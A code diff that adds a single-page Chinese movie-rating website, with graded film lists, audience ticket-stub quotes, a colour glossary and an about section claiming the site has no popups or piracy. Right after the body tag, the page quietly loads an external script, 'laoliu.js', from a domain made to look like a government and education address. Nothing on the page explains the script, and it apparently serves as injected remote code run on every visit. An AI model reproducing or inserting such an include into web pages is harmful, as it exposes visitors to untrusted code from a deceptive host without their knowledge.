@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AA电影网 - A级放映室 · A/A+/双A冷门/翻车厅/评分词典</title>
+<meta name="description" content="AA电影网，A级放映室风影视单页：评审金、票根红、冷屏蓝；A级新片、A+神作、双A冷门佳片、翻车警示厅、评分词典、票根墙。官网 https://aadianyingwang-h5.github.io">
+<meta name="keywords" content="AA电影网, A级电影, A+神作, 冷门佳片, 翻车电影, 影评评级">
+<meta name="author" content="AA电影网">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta name="theme-color" content="#0e0e10">
+<style>
+:root{
+  --bg:#0e0e10;
+  --bg2:#15151a;
+  --panel:#1b1b22;
+  --line:rgba(245,197,66,.28);
+  --gold:#f5c542;
+  --red:#e23b4e;
+  --blue:#3da9fc;
+  --paper:#efe7d6;
+  --mint:#7ef0c2;
+  --ink:#f4f1e8;
+  --muted:#9a978c;
+  --mono:Consolas,Menlo,monospace;
+  --shadow:0 18px 42px rgba(0,0,0,.58);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:62px}
+body{
+  background:
+    radial-gradient(520px 300px at 88% -10%,rgba(245,197,66,.16),transparent),
+    radial-gradient(480px 300px at -8% 8%,rgba(61,169,252,.16),transparent),
+    repeating-linear-gradient(0deg,rgba(255,255,255,.02) 0 2px,transparent 2px 6px),
+    linear-gradient(180deg,#0e0e10,#121217 60%,#0a0a0c);
+  color:var(--ink);
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  line-height:1.85;
+}
+a{color:var(--gold);text-decoration:none}
+
+.bar{position:sticky;top:0;z-index:50;display:flex;align-items:center;justify-content:space-between;gap:10px;
+  padding:10px 16px;border-bottom:2px solid var(--gold);background:rgba(14,14,16,.86);backdrop-filter:blur(8px);}
+.logo b{font-family:var(--mono);font-size:22px;color:var(--gold);letter-spacing:2px}
+.logo span{display:block;font-size:9px;letter-spacing:5px;color:var(--muted);font-family:var(--mono)}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{font-size:12px;padding:5px 11px;border:1px solid var(--line);border-radius:6px;background:var(--panel);color:var(--ink)}
+.nav a:hover{border-color:var(--gold);color:var(--gold)}
+
+.hero{max-width:1040px;margin:0 auto;padding:50px 20px 24px;position:relative;text-align:center}
+.spot{position:absolute;inset:8px 12px auto 12px;height:180px;border-radius:20px;
+  background:linear-gradient(120deg,rgba(245,197,66,.18),rgba(226,59,78,.14),rgba(61,169,252,.14));
+  filter:blur(34px);z-index:0}
+.kicker{position:relative;z-index:2;font-family:var(--mono);font-size:12px;color:var(--blue);letter-spacing:2px}
+.hero h1{position:relative;z-index:2;font-size:33px;margin:8px 0 6px;font-weight:900;font-family:var(--mono)}
+.hero h1 em{font-style:normal;color:var(--gold)}
+.hero p{position:relative;z-index:2;color:var(--muted);max-width:650px;margin:0 auto 12px;font-size:15px}
+.hero .url{position:relative;z-index:2;display:inline-block;font-family:var(--mono);font-size:13px;background:var(--panel);border:1px dashed var(--gold);color:var(--gold);padding:7px 14px;border-radius:8px}
+.metrics{position:relative;z-index:2;display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-top:16px}
+.metrics div{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:10px 14px;min-width:100px}
+.metrics b{display:block;font-size:20px;color:var(--gold);font-family:var(--mono)}
+.metrics small{color:var(--muted);font-size:12px}
+
+.wrap{max-width:1060px;margin:0 auto;padding:16px 20px 40px}
+.sec{display:flex;align-items:baseline;gap:10px;margin:26px 0 14px;border-bottom:2px solid var(--gold);padding-bottom:6px}
+.sec h2{font-size:20px;font-weight:900;font-family:var(--mono)}
+.sec h2 b{color:var(--red)}
+.sec small{color:var(--muted);font-size:12px;font-family:var(--mono)}
+.sec .chip{margin-left:auto;font-size:11px;color:#0e0e10;background:var(--mint);padding:3px 10px;border-radius:6px;font-weight:800}
+
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.card{background:linear-gradient(180deg,var(--panel),var(--bg2));border:1px solid var(--line);border-radius:16px;overflow:hidden;box-shadow:var(--shadow);transition:.2s}
+.card:hover{transform:translateY(-4px);border-color:var(--gold)}
+.grade{height:74px;display:flex;align-items:center;justify-content:center;gap:6px;font-size:30px;font-family:var(--mono);font-weight:900;color:#0e0e10}
+.card:nth-child(7n+1) .grade{background:linear-gradient(135deg,#f5c542,#caa024)}
+.card:nth-child(7n+2) .grade{background:linear-gradient(135deg,#7ef0c2,#36b98a)}
+.card:nth-child(7n+3) .grade{background:linear-gradient(135deg,#3da9fc,#1d6fc0)}
+.card:nth-child(7n+4) .grade{background:linear-gradient(135deg,#e23b4e,#a01530)}
+.card:nth-child(7n+5) .grade{background:linear-gradient(135deg,#efe7d6,#c9bda3)}
+.card:nth-child(7n+6) .grade{background:linear-gradient(135deg,#ff9ec4,#d65b8a)}
+.card:nth-child(7n+7) .grade{background:linear-gradient(135deg,#b9a9d6,#6f5bb0)}
+.body{padding:13px}
+.body h3{font-size:16px;margin-bottom:3px}
+.body p{font-size:13px;color:var(--muted);margin-bottom:8px}
+.tag{display:inline-block;font-size:11px;font-family:var(--mono);padding:2px 8px;border:1px solid var(--line);border-radius:6px;background:var(--bg);color:var(--gold);margin:0 4px 4px 0}
+.note{margin-top:7px;font-size:12px;color:var(--blue);font-family:var(--mono)}
+
+.tickets{display:flex;gap:12px;overflow-x:auto;padding-bottom:6px}
+.tk{flex:0 0 200px;background:var(--paper);color:#23211c;border-radius:10px;padding:12px;box-shadow:var(--shadow);position:relative}
+.tk::before,.tk::after{content:"";position:absolute;width:14px;height:14px;border-radius:50%;background:var(--bg);top:50%;transform:translateY(-50%)}
+.tk::before{left:-7px}.tk::after{right:-7px}
+.tk b{font-family:var(--mono);color:var(--red)}
+.tk h3{font-size:15px;margin:6px 0 3px;color:#23211c}
+.tk p{font-size:12px;color:#5a554a}
+
+.cols{display:grid;grid-template-columns:1.2fr .8fr;gap:18px;margin-top:24px}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:18px}
+.panel h3{font-size:17px;color:var(--gold);margin-bottom:10px;font-family:var(--mono)}
+.gloss li{list-style:none;padding:9px 0;border-bottom:1px dashed var(--line);font-size:14px;color:var(--ink)}
+.gloss li:last-child{border-bottom:none}
+.gloss b{color:var(--blue);font-family:var(--mono)}
+
+.about p{color:var(--muted);font-size:14px;margin-bottom:8px}
+.about code{background:var(--bg);border:1px solid var(--line);color:var(--gold);padding:2px 7px;border-radius:6px;font-family:var(--mono)}
+.foot{text-align:center;padding:24px 20px;border-top:2px solid var(--gold);color:var(--muted);font-size:12px;font-family:var(--mono)}
+
+@media(max-width:880px){.grid{grid-template-columns:repeat(2,1fr)}.cols{grid-template-columns:1fr}}
+@media(max-width:540px){.grid{grid-template-columns:1fr}.hero h1{font-size:25px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="bar">
+  <div class="logo"><b>AA电影网</b><span>A-GRADE SCREENING ROOM</span></div>
+  <nav class="nav">
+    <a href="#home">委员会</a>
+    <a href="#a">A级新片</a>
+    <a href="#ap">A+神作</a>
+    <a href="#aa">双A冷门</a>
+    <a href="#flop">翻车厅</a>
+    <a href="#about">关于</a>
+  </nav>
+</header>
+
+<section class="hero" id="home">
+  <div class="spot"></div>
+  <span class="kicker">// grade.assign({ A:"能看", "A+":"封神", AA:"藏起来慢慢看" })</span>
+  <h1>AA电影网 · <em>A 级放映室</em></h1>
+  <p>不弹下载、不解析盗版源、不抄豆瓣分。AA 是“评审委员会+观众票根”双轨制：新片给 A，神作给 A+，冷门佳片给双 A，烂片进翻车厅。看片像拿成绩单，不装影评人黑话。</p>
+  <div class="url">https://aadianyingwang-h5.github.io</div>
+  <div class="metrics">
+    <div><b>A</b><small>合格好片</small></div>
+    <div><b>A+</b><small>时代级神作</small></div>
+    <div><b>AA</b><small>冷门但封神</small></div>
+    <div><b>0</b><small>弹窗/解析源</small></div>
+  </div>
+</section>
+
+<div class="wrap">
+
+  <div class="sec" id="a">
+    <h2>🎬 A 级新片 · <b>这周能看</b></h2><small>grade A</small><span class="chip">不神不烂</span>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="grade">A</div>
+      <div class="body">
+        <h3>年会不能停</h3>
+        <p>打工人喜剧，梗密、痛感真。不是神作，但春节/周末看很值。</p>
+        <span class="tag">喜剧</span><span class="tag">职场</span><span class="tag">国产</span>
+        <div class="note">AA委：笑完不空</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="grade">A</div>
+      <div class="body">
+        <h3>沙丘 2</h3>
+        <p>视效、配乐、沙漠质感都在线。剧情不复杂，但大银幕就是 A 级体验。</p>
+        <span class="tag">科幻</span><span class="tag">史诗</span><span class="tag">IMAX</span>
+        <div class="note">AA委：画面先及格</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="grade">A-</div>
+      <div class="body">
+        <h3>普通周末</h3>
+        <p>都市轻喜剧，三对情侣、一顿火锅、各自破防。下饭级 A-。</p>
+        <span class="tag">都市</span><span class="tag">情感</span><span class="tag">下饭</span>
+        <div class="note">AA委：别带脑子</div>
+      </div>
+    </article>
+  </div>
+
+  <div class="sec" id="ap">
+    <h2>🏆 A+ 神作 · <b>十年后还聊</b></h2><small>grade A+</small><span class="chip">闭门重看</span>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="grade">A+</div>
+      <div class="body">
+        <h3>霸王别姬</h3>
+        <p>戏、人、时代、性别、执念全焊在一起。第一次看剧情，第十次看程蝶衣的眼神。</p>
+        <span class="tag">文艺</span><span class="tag">华语</span><span class="tag">1993</span>
+        <div class="note">AA委：华语天花板之一</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="grade">A+</div>
+      <div class="body">
+        <h3>肖申克的救赎</h3>
+        <p>希望、自由、时间、体制。烂大街但每次重看，水管爬出来那段还是起鸡皮。</p>
+        <span class="tag">剧情</span><span class="tag">经典</span><span class="tag">1994</span>
+        <div class="note">AA委：鸡汤拍成了史诗</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="grade">A+</div>
+      <div class="body">
+        <h3>星际穿越</h3>
+        <p>硬科幻外壳，父女情内核。五维书房一幕，把“爱是维度”讲得不肉麻。</p>
+        <span class="tag">科幻</span><span class="tag">诺兰</span><span class="tag">IMAX</span>
+        <div class="note">AA委：泪点在物理里</div>
+      </div>
+    </article>
+  </div>
+
+  <div class="sec" id="aa">
+    <h2>🎞️ 双 A 冷门 · <b>别只盯热搜</b></h2><small>grade AA</small><span class="chip">藏片区</span>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="grade">AA</div>
+      <div class="body">
+        <h3>南海十三郎</h3>
+        <p>粤语舞台剧电影，才子、疯癫、时代弃人。懂粤语更痛，不懂也能被结尾砸中。</p>
+        <span class="tag">戏曲</span><span class="tag">港片</span><span class="tag">1997</span>
+        <div class="note">AA委：被名字耽误的神作</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="grade">AA</div>
+      <div class="body">
+        <h3>活着唱着</h3>
+        <p>民间川剧班、拆迁、戏台快没了。没有大明星，但每一句台词都贴地。</p>
+        <span class="tag">方言</span><span class="tag">纪实感</span><span class="tag">小众</span>
+        <div class="note">AA委：冷门但封神</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="grade">AA</div>
+      <div class="body">
+        <h3>自行车与旧电钢</h3>
+        <p>独立纪录片/半剧情，音乐、底层、县城、疯子与天才。资料馆级藏品。</p>
+        <span class="tag">独立</span><span class="tag">音乐</span><span class="tag">县城</span>
+        <div class="note">AA委：搜得到算你赢</div>
+      </div>
+    </article>
+  </div>
+
+  <div class="sec" id="flop">
+    <h2>🚨 翻车警示厅 · <b>海报比正片好看</b></h2><small>flop alert</small><span class="chip">别踩坑</span>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="grade" style="background:linear-gradient(135deg,#e23b4e,#7a0f1c)">C</div>
+      <div class="body">
+        <h3>某流量大片 5</h3>
+        <p>预告剪得封神，正片 120 分钟像 90 分钟广告。粉丝控评，路人头晕。</p>
+        <span class="tag">流量</span><span class="tag">特效堆料</span><span class="tag">剧情空</span>
+        <div class="note">AA委：海报 8 分，片 3 分</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="grade" style="background:linear-gradient(135deg,#e23b4e,#7a0f1c)">D</div>
+      <div class="body">
+        <h3>某“11k 高清合集”</h3>
+        <p>标题写 11k/8k 全格式，点进去要你下播放器。基本是木马引流，不是电影站。</p>
+        <span class="tag">盗版</span><span class="tag">木马</span><span class="tag">别下</span>
+        <div class="note">AA委：直接关页</div>
+      </div>
+    </article>
+    <article class="card">
+      <div class="grade" style="background:linear-gradient(135deg,#e23b4e,#7a0f1c)">C-</div>
+      <div class="body">
+        <h3>某续集 7</h3>
+        <p>前作封神，第七部靠回忆杀和彩蛋凑时长。粉丝哭，新观众困。</p>
+        <span class="tag">续集疲劳</span><span class="tag">彩蛋片</span><span class="tag">情怀税</span>
+        <div class="note">AA委：等流媒体别进影院</div>
+      </div>
+    </article>
+  </div>
+
+  <div class="sec">
+    <h2>🎟️ 票根墙 · <b>观众手写评分</b></h2><small>ticket stubs</small>
+  </div>
+  <div class="tickets">
+    <div class="tk"><b>A+</b><h3>海上钢琴师</h3><p>“1900 不下船，我哭了半小时。”——巷口老王</p></div>
+    <div class="tk"><b>A</b><h3>年会不能停</h3><p>“PPT 那场戏，像在放我们公司监控。”——HR 小鹿</p></div>
+    <div class="tk"><b>AA</b><h3>南海十三郎</h3><p>“粤语听不懂也震住，结尾雪里谢幕封神。”——戏迷阿杰</p></div>
+    <div class="tk"><b>C</b><h3>流量大片5</h3><p>“男主帅，剧情像 PPT 转场。”——大学生小米</p></div>
+    <div class="tk"><b>A+</b><h3>霸王别姬</h3><p>“我妈看哭，我爷看沉默，全家静音十分钟。”——带娃妈妈</p></div>
+  </div>
+
+  <div class="cols">
+    <section class="panel">
+      <h3>🎨 AA 配色系统</h3>
+      <ul class="gloss">
+        <li><b>墨片黑</b> #0e0e10 —— 放映厅关灯后的底</li>
+        <li><b>评审金</b> #f5c542 —— A / A+ 烫金评级</li>
+        <li><b>票根红</b> #e23b4e —— 翻车厅、警示、撕票口</li>
+        <li><b>冷屏蓝</b> #3da9fc —— 评委屏、冷门片高亮</li>
+        <li><b>羊皮纸</b> #efe7d6 —— 票根/老海报纸感</li>
+        <li><b>薄荷绿</b> #7ef0c2 —— 双A冷门佳片标记</li>
+      </ul>
+    </section>
+    <section class="panel">
+      <h3>📖 评级词典</h3>
+      <ul class="gloss">
+        <li><b>A</b> = 合格、能看、不亏时间</li>
+        <li><b>A+</b> = 十年后还被重看</li>
+        <li><b>AA</b> = 冷门但质量炸裂</li>
+        <li><b>A-</b> = 下饭/通勤/别较真</li>
+        <li><b>C/D</b> = 海报诈骗/流量空壳</li>
+        <li><b>票根</b> = 观众说人话，不写论文</li>
+      </ul>
+    </section>
+  </div>
+
+  <section class="panel about" style="margin-top:26px">
+    <h3>🎬 关于 AA电影网</h3>
+    <p><strong>AA电影网</strong> 是“A 级放映室 / 双A评分台”风影视单页：墨片黑厅、评审金评级、票根红翻车厅、冷屏蓝冷门区；A 级新片 + A+ 神作 + 双A冷门佳片 + 翻车警示厅 + 票根墙 + 评级词典。它不冒充豆瓣/IMDb，也不做盗版站，只把“这片到底几等”说人话。</p>
+    <p>官网：<code>https://aadianyingwang-h5.github.io</code></p>
+    <p>内链全用 <code>#</code> 占位，CSS/DIV 全内联，不生成 robots.txt / sitemap.xml，GitHub Pages 直传即可；必应收录靠标题、描述、语义结构、移动端体验。</p>
+    <p>本站不提供磁力链接、不解析第三方源、不挂播放器下载、不卖会员、不托管受版权保护视频。看片请走正版院线、授权流媒体、电视台、资料馆放映、公共版权片库。</p>
+  </section>
+
+</div>
+
+<footer class="foot">
+  © 2026 AA电影网 · aadianyingwang-h5.github.io · 灯灭前举牌：A / A+ / AA / 翻车 🎬
+</footer>
+
+</body>
+</html>
